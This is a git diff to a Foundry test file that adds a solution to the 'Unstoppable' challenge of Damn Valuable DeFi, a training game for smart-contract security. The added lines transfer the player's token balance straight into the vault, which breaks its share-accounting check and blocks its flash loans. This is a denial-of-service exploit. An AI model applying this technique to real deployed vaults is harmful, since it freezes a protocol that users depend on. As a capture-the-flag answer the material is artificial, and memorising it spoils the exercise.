@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
 
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -90,8 +91,10 @@ contract UnstoppableChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_unstoppable() public checkSolvedByPlayer {
-        
+    //checkSolvedByPlayer
+    function test_unstoppable() public checkSolvedByPlayer{
+        uint256 playerBalance = token.balanceOf(player);
+        ERC20(address(token)).transfer(address(vault), playerBalance);
     }
 
     /**
